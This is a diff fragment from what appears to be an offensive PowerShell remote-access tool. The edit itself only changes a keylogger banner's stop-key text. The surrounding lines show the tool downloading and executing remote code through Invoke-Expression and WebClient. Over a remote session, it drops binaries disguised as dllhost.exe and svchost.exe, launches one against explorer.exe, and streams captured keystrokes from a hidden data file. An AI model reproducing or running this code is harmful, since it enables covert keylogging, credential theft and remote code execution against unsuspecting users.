@@ -588,7 +588,7 @@ if ($getkeys){ Invoke-Expression (New-Object Net.WebClient).DownloadString('http
 invoke-command -session $RDP[0] -scriptblock { Set-Content -Path $env:temp\dllhost.exe -Value $using:Content1 -Encoding Byte ; Set-Content -Path $env:temp\svchost.exe -Value $using:Content2 -Encoding Byte
 cd $env:temp ; .\dllhost.exe nomsg explorer.exe "$pwd\svchost.exe" ; Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
-Write-Host "                 Remote Keylogger " -NoNewLine -ForegroundColor Green ; Write-Host "| " -NoNewLine -ForegroundColor Gray ; Write-Host "Press 'x' to stop                 " -ForegroundColor Blue
+Write-Host "              Remote Keylogger " -NoNewLine -ForegroundColor Green ; Write-Host "| " -NoNewLine -ForegroundColor Gray ; Write-Host "Press 'Ctrl+C' to stop              " -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
 do { Get-Content -wait $env:localappdata\config.dat
 if ([Console]::KeyAvailable) { $key = [Console]::ReadKey($true)
